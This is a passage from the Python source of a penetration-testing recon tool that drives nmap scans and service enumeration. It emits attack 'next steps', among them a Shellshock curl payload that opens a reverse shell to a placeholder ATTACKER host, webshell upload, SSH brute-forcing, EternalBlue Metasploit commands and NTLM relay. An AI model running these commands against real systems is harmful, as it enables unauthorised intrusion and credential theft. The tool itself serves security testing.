#!/usr/bin/env python3
# ============================================================
#   Katarina — Penetration Testing Recon Tool
#   Author  : MTM
#   Version : 3.0
# ============================================================

import argparse
import subprocess
import sys
import os
import re
import socket
import datetime
import time
import json
import ipaddress
import platform
from pathlib import Path

# ─────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def info(msg):    print(f"{C.CYAN}[*]{C.RESET} {msg}")
def success(msg): print(f"{C.GREEN}[+]{C.RESET} {msg}")
def warning(msg): print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def error(msg):   print(f"{C.RED}[-]{C.RESET} {msg}")
def section(msg): print(f"\n{C.BOLD}{C.BLUE}{'═'*60}{C.RESET}\n{C.BOLD}{C.WHITE}  {msg}{C.RESET}\n{C.BOLD}{C.BLUE}{'═'*60}{C.RESET}")

# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
def print_banner():
    print(f"""
{C.RED}{C.BOLD}
 ██╗  ██╗ █████╗ ████████╗ █████╗ ██████╗ ██╗███╗   ██╗ █████╗
 ██║ ██╔╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║████╗  ██║██╔══██╗
 █████╔╝ ███████║   ██║   ███████║██████╔╝██║██╔██╗ ██║███████║
 ██╔═██╗ ██╔══██║   ██║   ██╔══██║██╔══██╗██║██║╚██╗██║██╔══██║
 ██║  ██╗██║  ██║   ██║   ██║  ██║██║  ██║██║██║ ╚████║██║  ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝{C.RESET}
{C.DIM}              Penetration Testing Recon Tool{C.RESET}
{C.YELLOW}                        by MTM{C.RESET}
{C.DIM}       ──────────────────────────────────────────{C.RESET}
{C.RED}{C.BOLD}              Hunt. Enumerate. Exploit.{C.RESET}
""")

# ─────────────────────────────────────────────
#  TARGET RESOLVER — single IP / range / subnet / list
# ─────────────────────────────────────────────
def resolve_targets(target_str):
    """
    Accepts:
      192.168.1.1          → single IP
      192.168.1.1,1.2,1.3 → comma-separated IPs
      192.168.1.1-10       → range (last octet)
      192.168.1.0/24       → CIDR subnet
    Returns list of IP strings.
    """
    targets = []
    # CIDR
    if "/" in target_str:
        try:
            net = ipaddress.ip_network(target_str, strict=False)
            targets = [str(h) for h in net.hosts()]
            info(f"Subnet {target_str} → {len(targets)} hosts")
            return targets
        except ValueError:
            error(f"Invalid CIDR: {target_str}")
            sys.exit(1)

    # Range like 192.168.1.1-20
    range_m = re.match(r"^(\d+\.\d+\.\d+\.)(\d+)-(\d+)$", target_str)
    if range_m:
        prefix, start, end = range_m.groups()
        for i in range(int(start), int(end)+1):
            targets.append(f"{prefix}{i}")
        info(f"Range {target_str} → {len(targets)} hosts")
        return targets

    # Comma-separated
    if "," in target_str:
        for t in target_str.split(","):
            t = t.strip()
            if t: targets.append(t)
        info(f"Multi-target → {len(targets)} hosts")
        return targets

    # Single IP
    return [target_str]

# ─────────────────────────────────────────────
#  ARGUMENT PARSER
# ─────────────────────────────────────────────
def parse_args():
    parser = argparse.ArgumentParser(
        prog="katarina.py",
        formatter_class=argparse.RawTextHelpFormatter,
        description=f"{C.BOLD}Katarina v3.0 — Penetration Testing Recon Tool by MTM{C.RESET}",
        epilog=f"""
{C.BOLD}TARGET (positional):{C.RESET}
  192.168.1.1            Single IP
  192.168.1.1-20         Range (last octet 1 to 20)
  192.168.1.0/24         Full subnet
  192.168.1.1,1.2,1.3   Comma-separated IPs

{C.BOLD}PORT OPTIONS (-p):{C.RESET}
  all           All 65535 ports
  top100        Top 100 most common ports
  top1000       Top 1000 most common ports (default)
  21            Single port
  20-100        Port range
  21,22,80,443  Comma-separated list

{C.BOLD}SCAN TYPE (-s):{C.RESET}
  tcp           TCP only
  udp           UDP only
  both          TCP + UDP (default)

{C.BOLD}TIMING (-t):{C.RESET}
  stealth       Very slow, avoids IDS (T2)
  normal        Default speed (T3)
  aggressive    Fast scan (T4)

{C.BOLD}OUTPUT (-o):{C.RESET}
  report.pdf    PDF report
  report.html   HTML report
  report.txt    Text report
  NOTE: for multiple targets, output filename becomes target_report.pdf

{C.BOLD}EXAMPLES:{C.RESET}
  ./katarina.py 192.168.1.1
  ./katarina.py 192.168.1.1 -p top100 -s tcp -o report.pdf
  ./katarina.py 192.168.1.1-20 -p top1000 -t aggressive -o scan.html
  ./katarina.py 192.168.1.0/24 -p top100 -s tcp
  ./katarina.py 192.168.1.1,192.168.1.5 -p 22,80,443 -s tcp -o results.pdf
  ./katarina.py 192.168.1.1 -p all -t stealth -o report.html
"""
    )
    parser.add_argument("target",                                          help="Target: IP, IP range, CIDR subnet, or comma-separated IPs")
    parser.add_argument("-p","--ports",   default="top1000",              help="Port selection (default: top1000)")
    parser.add_argument("-s","--scan",    default="both",
                        choices=["tcp","udp","both"],                      help="Scan type (default: both)")
    parser.add_argument("-t","--timing",  default="normal",
                        choices=["stealth","normal","aggressive"],         help="Timing (default: normal)")
    parser.add_argument("-o","--output",  default=None,                   help="Output file (.pdf/.html/.txt)")
    parser.add_argument("-v","--verbose", action="store_true",            help="Verbose output")
    return parser.parse_args()

# ─────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────
def resolve_ports(port_arg, scan_type):
    if port_arg == "top1000":
        if scan_type == "tcp":   return ("--top-ports","1000","tcp-only","Top 1000 TCP ports")
        elif scan_type == "udp": return ("--top-ports","1000","udp-only","Top 1000 UDP ports")
        else:                    return ("--top-ports","1000",False,"Top 1000 mixed ports")
    elif port_arg == "top100":
        if scan_type == "tcp":   return ("--top-ports","100","tcp-only","Top 100 TCP ports")
        elif scan_type == "udp": return ("--top-ports","100","udp-only","Top 100 UDP ports")
        else:                    return ("--top-ports","100",False,"Top 100 mixed ports")
    elif port_arg == "all":      return ("-p","1-65535",None,"All 65535 ports")
    elif re.match(r"^\d+$",port_arg):         return ("-p",port_arg,None,f"Port {port_arg}")
    elif re.match(r"^\d+-\d+$",port_arg):     return ("-p",port_arg,None,f"Port range {port_arg}")
    elif re.match(r"^[\d,]+$",port_arg):      return ("-p",port_arg,None,f"Ports {port_arg}")
    else: error(f"Invalid port spec: {port_arg}"); sys.exit(1)

def timing_flag(timing):
    return {"stealth":"-T2","normal":"-T3","aggressive":"-T4"}[timing]

def count_ports(port_flag, port_val):
    """Estimate port count from resolve_ports output."""
    if port_flag == "--top-ports":
        return int(port_val)
    if "-" in port_val:
        parts = port_val.split("-")
        return int(parts[1]) - int(parts[0]) + 1
    if "," in port_val:
        return len(port_val.split(","))
    return 1

def scan_timeout(port_count, includes_udp, timing):
    """Calculate subprocess timeout ceiling for nmap scan."""
    tcp_rate = {"stealth": 1.5, "normal": 0.5, "aggressive": 0.2}[timing]
    udp_rate = {"stealth": 5.0, "normal": 3.0, "aggressive": 1.0}[timing]
    secs = port_count * tcp_rate
    if includes_udp:
        secs += port_count * udp_rate
    return max(300, int(secs))

def estimate_scan_time(port_count, includes_udp, timing):
    """Estimate typical scan duration (not worst-case) for user display."""
    tcp_rate = {"stealth": 0.8, "normal": 0.3, "aggressive": 0.1}[timing]
    udp_rate = {"stealth": 3.0, "normal": 1.5, "aggressive": 0.5}[timing]
    secs = port_count * tcp_rate
    if includes_udp:
        secs += port_count * udp_rate
    minutes = secs / 60
    if minutes < 2:
        return None
    if minutes < 5:
        return f"~{int(minutes)}-{int(minutes)+2} minutes"
    return f"~{int(minutes)}-{int(minutes * 1.5)} minutes"

_TIMEOUT_SENTINEL = "__TIMEOUT__"

def run_cmd(cmd, verbose=False, timeout=300):
    if verbose: info(f"CMD: {' '.join(cmd)}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if verbose and r.stderr:
            for line in r.stderr.strip().splitlines()[:5]:
                info(f"  stderr: {line}")
        return r.stdout
    except subprocess.TimeoutExpired:
        warning("Command timed out")
        return _TIMEOUT_SENTINEL
    except FileNotFoundError:
        error(f"Tool not found: {cmd[0]}")
        return ""

# Known service names for common ports
PORT_SERVICE_MAP = {
    "21":"FTP","22":"SSH","23":"Telnet","25":"SMTP","53":"DNS",
    "80":"HTTP","110":"POP3","111":"RPC/portmapper","119":"NNTP",
    "135":"MS-RPC","139":"NetBIOS/SMB","143":"IMAP","161":"SNMP",
    "389":"LDAP","443":"HTTPS","445":"SMB","512":"rexec",
    "513":"rlogin","514":"rsh","873":"rsync","993":"IMAPS",
    "995":"POP3S","1024":"RPC-status","1433":"MSSQL","1521":"Oracle",
    "2049":"NFS","3306":"MySQL","3389":"RDP","5432":"PostgreSQL",
    "5900":"VNC","6379":"Redis","8080":"HTTP-Alt","8443":"HTTPS-Alt",
    "8888":"HTTP-Alt","9200":"Elasticsearch","27017":"MongoDB",
}

def friendly_service(port, service_name):
    """Return a human-readable service name"""
    p = str(port)
    if p in PORT_SERVICE_MAP:
        return PORT_SERVICE_MAP[p]
    if service_name and service_name not in ("unknown",""):
        return service_name
    return f"port-{port}"

# ─────────────────────────────────────────────
#  PHASE 0 — HOST DISCOVERY
# ─────────────────────────────────────────────
def phase_host_discovery(target, verbose):
    section(f"PHASE 0 — Host Discovery [{target}]")
    result = {"alive":False,"hostname":"N/A","method":"N/A",
              "os_name":"N/A","os_version":"N/A","os_accuracy":"N/A",
              "os_family":"N/A","os_cpe":"N/A","ttl":"N/A"}

    info(f"Pinging {target} ...")
    ping_out = run_cmd(["ping","-c","3","-W","2",target], verbose)
    if any(x in ping_out for x in ["1 received","2 received","3 received"]):
        success("Host is UP (ICMP ping)")
        result["alive"]  = True
        result["method"] = "ICMP"
        ttl_m = re.search(r"ttl=(\d+)", ping_out, re.IGNORECASE)
        if ttl_m:
            ttl = int(ttl_m.group(1))
            result["ttl"] = str(ttl)
            if ttl <= 64:    result["os_family"] = "Linux/Unix (TTL≤64)"
            elif ttl <= 128: result["os_family"] = "Windows (TTL≤128)"
            else:            result["os_family"] = "Cisco/Solaris (TTL≤255)"
            info(f"TTL={ttl} → OS hint: {result['os_family']}")
    else:
        warning("ICMP failed — trying TCP probes ...")
        for port in [80,443,22,445,3389]:
            try:
                s = socket.create_connection((target,port),timeout=2)
                s.close()
                success(f"Host is UP (TCP:{port})")
                result["alive"]  = True
                result["method"] = f"TCP:{port}"
                break
            except: pass
        if not result["alive"]:
            warning("Host appears DOWN — continuing anyway")
            result["alive"] = True

    try:
        result["hostname"] = socket.gethostbyaddr(target)[0]
        success(f"Hostname: {result['hostname']}")
    except: pass

    info("OS fingerprint (nmap -O) ...")
    os_out = run_cmd(["nmap","-O","--osscan-guess","--osscan-limit","-n","-T4","--max-retries","2",target], verbose)

    od = re.search(r"OS details:\s*(.+)", os_out)
    if od: result["os_name"] = od.group(1).strip()

    ag = re.search(r"Aggressive OS guesses:\s*(.+?)(?:\n|$)", os_out)
    if ag:
        first = ag.group(1).split(",")[0].strip()
        acc   = re.search(r"\((\d+)%\)", first)
        if result["os_name"] == "N/A":
            result["os_name"] = re.sub(r"\s*\(\d+%\)","",first).strip()
        result["os_accuracy"] = acc.group(1)+"%" if acc else "N/A"

    ver_hint = re.search(r"Running(?:\s*\(JUST GUESSING\))?:\s*(.+)", os_out)
    if ver_hint: result["os_version"] = ver_hint.group(1).strip()

    cpe = re.search(r"(cpe:/o:[^\s]+)", os_out)
    if cpe: result["os_cpe"] = cpe.group(1)

    if result["os_name"] != "N/A":
        success(f"OS: {result['os_name']} (accuracy: {result['os_accuracy']})")
    else:
        warning("OS fingerprint inconclusive")

    return result

# ─────────────────────────────────────────────
#  PHASE 1 — PORT SCAN
# ─────────────────────────────────────────────
def phase_port_scan(target, ports_arg, scan_type, timing, verbose):
    section(f"PHASE 1 — Port Scanning [{target}]")
    port_flag, port_val, proto_mode, ports_desc = resolve_ports(ports_arg, scan_type)
    t_flag  = timing_flag(timing)
    results = {"tcp":[],"udp":[],"desc":ports_desc}
    n_ports = count_ports(port_flag, port_val)

    def parse_nmap_xml(xml_out, proto_filter=None):
        found = []
        if xml_out == _TIMEOUT_SENTINEL:
            return found
        for b in re.finditer(r'<port protocol="(\w+)" portid="(\d+)">(.*?)</port>', xml_out, re.DOTALL):
            proto, portid, inner = b.groups()
            if proto_filter and proto != proto_filter: continue
            state_m = re.search(r'state="([^"]+)"', inner)
            svc_m   = re.search(r'<service name="([^"]*)"', inner)
            if state_m and "open" in state_m.group(1):
                raw_svc = svc_m.group(1) if svc_m else "unknown"
                found.append({"port":portid,"service":friendly_service(portid, raw_svc),"raw_service":raw_svc})
        return found

    nmap_out = ""
    timed_out = False

    if proto_mode is False:
        includes_udp = True
        t_out = scan_timeout(n_ports, True, timing)
        est = estimate_scan_time(n_ports, True, timing)
        info(f"Mixed TCP+UDP — {ports_desc} [{timing}]")
        if est: info(f"Estimated scan time: {est}")
        cmd = ["nmap","-sS","-sU",t_flag,"--open",port_flag,port_val,"-oX","-",target]
        nmap_out = run_cmd(cmd, verbose, timeout=t_out)
    elif proto_mode == "tcp-only" or scan_type == "tcp":
        includes_udp = False
        t_out = scan_timeout(n_ports, False, timing)
        est = estimate_scan_time(n_ports, False, timing)
        info(f"TCP scan — {ports_desc} [{timing}]")
        if est: info(f"Estimated scan time: {est}")
        nmap_out = run_cmd(["nmap","-sS",t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose, timeout=t_out)
    elif proto_mode == "udp-only" or scan_type == "udp":
        includes_udp = True
        t_out = scan_timeout(n_ports, True, timing)
        est = estimate_scan_time(n_ports, True, timing)
        info(f"UDP scan — {ports_desc} [{timing}]")
        if est: info(f"Estimated scan time: {est}")
        nmap_out = run_cmd(["nmap","-sU",t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose, timeout=t_out)
    else:
        includes_udp = True
        info(f"Separate TCP + UDP — {ports_desc} [{timing}]")
        est = estimate_scan_time(n_ports, True, timing)
        if est: info(f"Estimated scan time: {est}")
        tcp_tout = scan_timeout(n_ports, False, timing)
        udp_tout = scan_timeout(n_ports, True, timing)
        info(f"TCP scan ...")
        tcp_out = run_cmd(["nmap","-sS",t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose, timeout=tcp_tout)
        if tcp_out != _TIMEOUT_SENTINEL:
            results["tcp"] = parse_nmap_xml(tcp_out,"tcp")
        else:
            timed_out = True
        info(f"UDP scan ...")
        udp_out = run_cmd(["nmap","-sU",t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose, timeout=udp_tout)
        if udp_out != _TIMEOUT_SENTINEL:
            results["udp"] = parse_nmap_xml(udp_out,"udp")
        else:
            timed_out = True
        nmap_out = (tcp_out or "") + (udp_out or "")

    if nmap_out == _TIMEOUT_SENTINEL:
        timed_out = True

    if not timed_out:
        results["tcp"] = results["tcp"] or parse_nmap_xml(nmap_out, "tcp")
        results["udp"] = results["udp"] or parse_nmap_xml(nmap_out, "udp")

    for p in results["tcp"]: success(f"  TCP {p['port']:>5}/tcp   {p['service']}")
    for p in results["udp"]: success(f"  UDP {p['port']:>5}/udp   {p['service']}")
    if not results["tcp"] and not results["udp"]:
        if timed_out:
            error(f"Scan timed out — {n_ports} ports {'(TCP+UDP)' if includes_udp else '(TCP)'} exceeded the time limit")
            if includes_udp:
                error("  UDP scanning is slow. Try: -s tcp (TCP only, much faster)")
            error("  Or scan fewer ports: -p top100")
            if timing != "aggressive":
                error("  Or use aggressive timing: -t aggressive")
        elif len(nmap_out) < 100 or "<port " not in nmap_out:
            error("nmap produced no output — SYN and UDP scans require root/sudo")
            error(f"  Try: sudo python3 katarina.py {target}")
        else:
            warning("No open ports found")
    return results

# ─────────────────────────────────────────────
#  PHASE 2 — FIREWALL ANALYSIS
# ─────────────────────────────────────────────
def _parse_port_states(xml_output):
    """Extract per-port states from nmap XML, returning {state: [portids]}."""
    by_state = {}
    for m in re.finditer(r'<port protocol="\w+" portid="(\d+)">(.*?)</port>', xml_output, re.DOTALL):
        portid, inner = m.groups()
        sm = re.search(r'state="([^"]+)"', inner)
        if sm:
            by_state.setdefault(sm.group(1), []).append(portid)
    return by_state

def _has_root():
    if platform.system() == "Windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return True
    return os.geteuid() == 0

def phase_firewall_analysis(target, ports_arg, scan_type, timing, verbose):
    section(f"PHASE 2 — Firewall Analysis [{target}]")
    analysis = {"firewall_detected":False,"filtered_ports":[],"unfiltered_ports":[],
                "window_open":[],"notes":[],"skipped":False}

    if not _has_root():
        warning("ACK and Window scans require root/sudo — skipping firewall analysis")
        analysis["skipped"] = True
        analysis["notes"].append("Skipped: requires root/sudo privileges")
        return analysis

    _, port_val, _, _ = resolve_ports(ports_arg, scan_type)
    t_flag   = timing_flag(timing)
    port_args = ["-p",port_val] if port_val not in ("1000","100") else ["--top-ports","100"]

    info("ACK scan ...")
    out = run_cmd(["nmap","-sA","-n",t_flag]+port_args+["-oX","-",target], verbose)
    if out == _TIMEOUT_SENTINEL:
        warning("ACK scan timed out — firewall results may be incomplete")
        analysis["notes"].append("ACK scan timed out")
    else:
        ack_states = _parse_port_states(out)
        analysis["filtered_ports"]   = ack_states.get("filtered", [])
        analysis["unfiltered_ports"] = ack_states.get("unfiltered", [])
        if analysis["filtered_ports"]:
            analysis["firewall_detected"] = True
            n = len(analysis["filtered_ports"])
            warning(f"Firewall DETECTED — {n} filtered port(s)")
            analysis["notes"].append(f"Stateful firewall filtering {n} port(s)")
            if analysis["unfiltered_ports"]:
                u = len(analysis["unfiltered_ports"])
                info(f"  {u} port(s) unfiltered (not behind firewall)")
        else:
            success("No stateful firewall detected (all ports unfiltered)")

    info("Window scan ...")
    out2 = run_cmd(["nmap","-sW","-n",t_flag]+port_args+["-oX","-",target], verbose)
    if out2 == _TIMEOUT_SENTINEL:
        warning("Window scan timed out")
        analysis["notes"].append("Window scan timed out")
    else:
        win_states = _parse_port_states(out2)
        win_filtered = win_states.get("filtered", [])
        win_open     = win_states.get("open", [])
        win_closed   = win_states.get("closed", [])
        if win_filtered:
            if not analysis["firewall_detected"]:
                analysis["firewall_detected"] = True
                warning(f"Window scan detected filtering on {len(win_filtered)} port(s)")
            analysis["notes"].append(f"Window scan: {len(win_filtered)} filtered port(s)")
        if win_open:
            analysis["window_open"] = win_open
            success(f"  Window scan reveals {len(win_open)} open port(s) behind firewall: {', '.join(win_open[:10])}")
            analysis["notes"].append(f"Window scan reveals open ports behind firewall: {', '.join(win_open[:10])}")
        if win_closed:
            info(f"  Window scan: {len(win_closed)} closed port(s)")

    if not analysis["firewall_detected"] and not analysis["skipped"]:
        success("No significant filtering detected")
    return analysis

# ─────────────────────────────────────────────
#  PHASE 3 — SERVICE & VERSION DETECTION
# ─────────────────────────────────────────────
def phase_service_detection(target, port_results, timing, verbose):
    section(f"PHASE 3 — Service & Version Detection [{target}]")
    t_flag   = timing_flag(timing)
    services = []
    all_ports = list({p["port"] for p in port_results.get("tcp",[])+port_results.get("udp",[])})
    if not all_ports:
        warning("No open ports — skipping")
        return services

    port_str = ",".join(all_ports)
    info(f"Version detection on {len(all_ports)} port(s) ...")
    out = run_cmd(["nmap","-sV","--version-intensity","7","-O","--osscan-guess",
                   "-n",t_flag,"-p",port_str,"-oX","-",target], verbose)

    for b in re.finditer(r'<port protocol="(\w+)" portid="(\d+)">(.*?)</port>', out, re.DOTALL):
        proto, port, inner = b.groups()
        state_m = re.search(r'state="([^"]+)"', inner)
        if not state_m or "open" not in state_m.group(1): continue
        svc_m = re.search(
            r'<service name="([^"]*)"(?:[^>]*product="([^"]*)")?'
            r'(?:[^>]*version="([^"]*)")?(?:[^>]*extrainfo="([^"]*)")?', inner)
        if svc_m:
            name,product,version,extra = svc_m.groups()
            raw_svc  = name or "unknown"
            friendly = friendly_service(port, product or name)
            entry = {"proto":proto,"port":port,
                     "service":friendly,"raw_service":raw_svc,
                     "product":product or "","version":version or "",
                     "extra":extra or "","target":target}
            services.append(entry)
            disp = f"{product or friendly} {version or ''}".strip()
            success(f"  {port:>5}/{proto}  {disp}")

    os_m = re.search(r"OS details:\s*(.+)", out)
    if os_m: success(f"  OS: {os_m.group(1).strip()}")
    return services

# ─────────────────────────────────────────────
#  PHASE 4 — SERVICE-SPECIFIC ENUMERATION
#  Includes unauthenticated/anonymous access checks
# ─────────────────────────────────────────────
def phase_enumeration(target, services, verbose):
    section(f"PHASE 4 — Service Enumeration [{target}]")
    enum_results = {}

    for svc in services:
        port    = svc["port"]
        service = svc["raw_service"].lower()
        friendly= svc["service"]
        proto   = svc["proto"]
        key     = f"{port}/{proto}"
        info(f"Enumerating {friendly} on {key} ...")

        # ── FTP ─────────────────────────────────────────────
        if service == "ftp" or port == "21":
            out = run_cmd(["nmap","-p",port,"--script",
                           "ftp-anon,ftp-syst,ftp-bounce,ftp-brute",
                           "-oN","-",target], verbose)
            anon = "ALLOWED" if "Anonymous FTP login allowed" in out else "DENIED"
            files = re.findall(r"\|\s+([-d].{8}\s+.+)", out)
            enum_results[key] = {"service":"FTP","anonymous":anon,"files":files[:20],"raw":out[:1000],"findings":[]}
            col = C.RED if anon == "ALLOWED" else C.GREEN
            print(f"  {col}FTP Anonymous login: {anon}{C.RESET}")
            if files:
                warning(f"  FTP directory listing ({len(files)} entries):")
                for f in files[:5]: info(f"    {f}")

            if anon == "ALLOWED" and files:
                enum_results[key]["findings"].append({
                    "fact":f"Anonymous login allowed — {len(files)} files visible",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Download everything: wget -r ftp://anonymous:@{target}/",
                        "Review files for credentials, configs, backups",
                        "Check for writable directories — upload a webshell if web-accessible",
                    ]})
            elif anon == "ALLOWED":
                enum_results[key]["findings"].append({
                    "fact":"Anonymous login allowed",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Connect: ftp {target}",
                        "Check for writable directories",
                        "Try uploading a test file",
                    ]})

        # ── SSH ──────────────────────────────────────────────
        elif service == "ssh" or port == "22":
            out = run_cmd(["nmap","-p",port,"--script",
                           "ssh-auth-methods,ssh2-enum-algos,ssh-hostkey",
                           "-oN","-",target], verbose)
            enum_results[key] = {"service":"SSH","raw":out[:800],"findings":[]}
            if "password" in out.lower():
                warning(f"  SSH → Password auth ENABLED — brute-force possible")
            if "publickey" in out.lower():
                info(f"  SSH → Public key auth available")
            if "none" in out.lower() and "Supported authentication" in out:
                warning(f"  SSH → Auth: NONE — no password required!")

            if "none" in out.lower() and "Supported authentication" in out:
                enum_results[key]["findings"].append({
                    "fact":"No authentication required",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Connect directly: ssh {target}",
                        "Check what user you land as, escalate from there",
                    ]})
            elif "password" in out.lower():
                enum_results[key]["findings"].append({
                    "fact":"Password authentication enabled",
                    "severity":"MEDIUM",
                    "next_steps":[
                        f"Try common creds: ssh root@{target} (root:root, admin:admin)",
                        f"Brute-force: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target}",
                    ]})

        # ── HTTP/HTTPS ───────────────────────────────────────
        elif service in ("http","https","http-alt","ssl/http") or port in ("80","443","8080","8443","8000","8888"):
            scheme = "https" if port in ("443","8443") or service == "https" else "http"
            out = run_cmd(["nmap","-p",port,"--script",
                           "http-title,http-server-header,http-methods,http-robots.txt,"
                           "http-auth-finder,http-shellshock,http-phpinfo",
                           "-oN","-",target], verbose)
            title  = re.search(r"http-title: (.+)", out)
            server = re.search(r"http-server-header: (.+)", out)
            robots = "robots.txt found" if "robots.txt" in out.lower() else ""
            enum_results[key] = {"service":"HTTP",
                "title":title.group(1).strip() if title else "N/A",
                "server":server.group(1).strip() if server else "N/A",
                "robots":robots,"raw":out[:1000],"findings":[]}
            if title:  info(f"  HTTP → Title  : {title.group(1).strip()}")
            if server: info(f"  HTTP → Server : {server.group(1).strip()}")
            if robots: warning(f"  HTTP → {robots}")
            if "shellshock" in out.lower(): warning(f"  HTTP → Shellshock vulnerable!")

            if "shellshock" in out.lower():
                enum_results[key]["findings"].append({
                    "fact":"Shellshock vulnerability confirmed",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Exploit: curl -A '() {{ :; }}; /bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' {scheme}://{target}:{port}/cgi-bin/STATUS_URI",
                        f"Metasploit: use exploit/multi/http/apache_mod_cgi_bash_env_exec",
                    ]})
            if robots:
                enum_results[key]["findings"].append({
                    "fact":"robots.txt found — may reveal hidden paths",
                    "severity":"MEDIUM",
                    "next_steps":[
                        f"Read it: curl {scheme}://{target}:{port}/robots.txt",
                        "Visit each disallowed path manually",
                        f"Feed paths to gobuster or feroxbuster",
                    ]})
            title_str = title.group(1).strip() if title else ""
            server_str = server.group(1).strip() if server else ""
            desc_parts = [p for p in [server_str, title_str] if p and p != "N/A"]
            desc = " — ".join(desc_parts) if desc_parts else "web server"
            enum_results[key]["findings"].append({
                "fact":f"Web server detected: {desc}",
                "severity":"MEDIUM",
                "next_steps":[
                    f"Directory brute-force: gobuster dir -u {scheme}://{target}:{port} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt",
                    f"Vuln scan: nikto -h {scheme}://{target}:{port}",
                    "Check source code, login forms, file uploads for SQLi/XSS/LFI",
                ]})

        # ── SMB / NetBIOS ────────────────────────────────────
        elif service in ("netbios-ssn","microsoft-ds","smb") or port in ("139","445"):
            info(f"  SMB null session attempt ...")
            smb_scripts = ("smb-os-discovery,smb-security-mode,smb2-security-mode,"
                           "smb-enum-shares,smb-enum-users,smb-enum-groups,"
                           "smb-vuln-ms17-010,smb-vuln-ms08-067")
            out = run_cmd(["nmap","-p",port,"--script",smb_scripts,"-oN","-",target], verbose, timeout=120)

            shares = re.findall(r"\|\s+(\\\\[^\s]+|[A-Z$]+)\s+\|\s+(\w+)", out)
            users  = re.findall(r"user:\[([^\]]+)\]", out, re.IGNORECASE)
            null_session = "NULL session allowed" if ("account_used: <blank>" in out or
                           "account_used: guest" in out) else "NULL session unknown"

            enum_results[key] = {"service":"SMB","null_session":null_session,
                                 "shares":shares,"users":users,"raw":out[:1500],"findings":[]}

            if "account_used: <blank>" in out or "account_used: guest" in out:
                warning(f"  SMB → {null_session}")
            os_d = re.search(r"OS: (.+)", out)
            if os_d: info(f"  SMB → OS: {os_d.group(1).strip()}")
            if shares:
                info(f"  SMB → {len(shares)} share(s) found")
                for s in shares[:5]: info(f"    {s[0]} ({s[1]})")
            if users:
                warning(f"  SMB → {len(users)} user(s) found: {', '.join(users[:10])}")
            if "Message signing enabled but not required" in out:
                warning("  SMB → Signing NOT required — relay attack possible")
            if "VULNERABLE" in out:
                warning(f"  SMB → VULNERABILITY DETECTED (EternalBlue/MS08-067)!")

            smb_out = run_cmd(["smbclient","-L",f"//{target}","-N","--no-pass"], verbose, timeout=15)
            if smb_out and "Sharename" in smb_out:
                warning(f"  SMB → smbclient NULL session: SUCCESS")
                share_lines = re.findall(r"^\s+(\S+)\s+(\S+)\s*(.*)", smb_out, re.MULTILINE)
                for s in share_lines[:8]:
                    info(f"    Share: {s[0]} ({s[1]}) {s[2]}")
                enum_results[key]["smbclient"] = smb_out[:800]

            if "VULNERABLE" in out:
                enum_results[key]["findings"].append({
                    "fact":"Known SMB vulnerability confirmed (EternalBlue/MS08-067)",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"EternalBlue: msfconsole → use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS {target}",
                        f"MS08-067: msfconsole → use exploit/windows/smb/ms08_067_netapi → set RHOST {target}",
                    ]})
            if null_session == "NULL session allowed":
                enum_results[key]["findings"].append({
                    "fact":"Null session access confirmed",
                    "severity":"HIGH",
                    "next_steps":[
                        f"Enumerate shares: smbmap -H {target}",
                        f"Check for writable shares: smbmap -H {target} -R",
                        "Look for sensitive files in readable shares",
                    ]})
            if "Message signing enabled but not required" in out:
                enum_results[key]["findings"].append({
                    "fact":"SMB signing not required — relay attack possible",
                    "severity":"HIGH",
                    "next_steps":[
                        "Capture hashes: responder -I eth0",
                        f"Relay: ntlmrelayx.py -t {target} -smb2support",
                    ]})
            if users:
                user_list = ', '.join(users[:10])
                enum_results[key]["findings"].append({
                    "fact":f"{len(users)} user(s) enumerated: {user_list}",
                    "severity":"MEDIUM",
                    "next_steps":[
                        f"Password spray these users: crackmapexec smb {target} -u users.txt -p passwords.txt",
                        "Check for password reuse with any found credentials",
                    ]})
            if shares:
                share_list = ', '.join(s[0] for s in shares[:5])
                enum_results[key]["findings"].append({
                    "fact":f"{len(shares)} share(s) found: {share_list}",
                    "severity":"MEDIUM",
                    "next_steps":[
                        f"Check permissions on each: smbmap -H {target}",
                        f"Access readable shares: smbclient //{target}/SHARENAME -N",
                    ]})

        # ── SMTP ─────────────────────────────────────────────
        elif service == "smtp" or port in ("25","465","587"):
            out = run_cmd(["nmap","-p",port,"--script",
                           "smtp-commands,smtp-open-relay,smtp-enum-users",
                           "-oN","-",target], verbose)
            enum_results[key] = {"service":"SMTP","raw":out[:800],"findings":[]}
            if "VRFY" in out: warning(f"  SMTP → VRFY enabled — user enumeration possible")
            if "EXPN" in out: warning(f"  SMTP → EXPN enabled")
            if "open relay" in out.lower(): warning(f"  SMTP → OPEN RELAY detected!")

            if "open relay" in out.lower():
                enum_results[key]["findings"].append({
                    "fact":"Open relay confirmed",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Send test mail: swaks --to user@target --from attacker@fake.com --server {target}",
                        "Use for phishing within engagement scope",
                    ]})
            if "VRFY" in out:
                enum_results[key]["findings"].append({
